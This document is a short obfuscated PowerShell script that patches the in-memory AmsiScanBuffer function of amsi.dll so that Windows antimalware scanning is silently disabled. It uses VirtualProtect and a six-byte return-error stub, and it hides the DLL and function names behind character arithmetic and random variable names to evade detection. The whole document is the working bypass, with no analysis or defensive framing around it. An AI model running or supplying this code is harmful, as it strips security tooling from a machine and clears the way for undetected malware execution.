$TXWA = @"
using System;
using System.Runtime.InteropServices;
public class TXWA {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr AAxXFqO, string siYV6wndF8xNoHjrPy0);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr jD4C881ShcubcHHHtxC, UIntPtr yknTM5o1skB1, uint EGnSe7S5XPXjX, out uint rvPS);
}
"@

Add-Type $TXWA

$VgifXmbbP8S6jU = [TXWA]::LoadLibrary("$([CHAR]([byte]0x61)+[CHaR]([BYTE]0x6d)+[CHar]([Byte]0x73)+[chAr](105*92/92)+[chaR]([BYTe]0x2e)+[CHAR]([byTE]0x64)+[chAr]([bYte]0x6c)+[CHAR](108*57/57))")
$a6J2Cn_ = [TXWA]::GetProcAddress($VgifXmbbP8S6jU, "$([ChAR]([bytE]0x41)+[CHaR]([BYte]0x6d)+[CHAR](113+2)+[Char](105)+[chAR](83*56/56)+[chaR](76+23)+[CHar](97)+[ChAR]([byte]0x6e)+[chAr](66+51-51)+[CHAr]([bytE]0x75)+[chAr](102)+[cHar](69+33)+[CHAR](101)+[cHAr](114+26-26))")
$p = 0
[TXWA]::VirtualProtect($a6J2Cn_, [uint32]5, 0x40, [ref]$p)
$r8c4ZplSEe = "0xB8"
$y8yQ8h = "0x57"
$uSObq = "0x00"
$rHxewjf8Xd = "0x07"
$x2E7QxOCQegMqmGkymJr = "0x80"
$Ao4NYiX8u8L = "0xC3"
$l5bREQGVcp1vTzL = [Byte[]] ($r8c4ZplSEe,$y8yQ8h,$uSObq,$rHxewjf8Xd,+$x2E7QxOCQegMqmGkymJr,+$Ao4NYiX8u8L)
[System.Runtime.InteropServices.Marshal]::Copy($l5bREQGVcp1vTzL, 0, $a6J2Cn_, 6)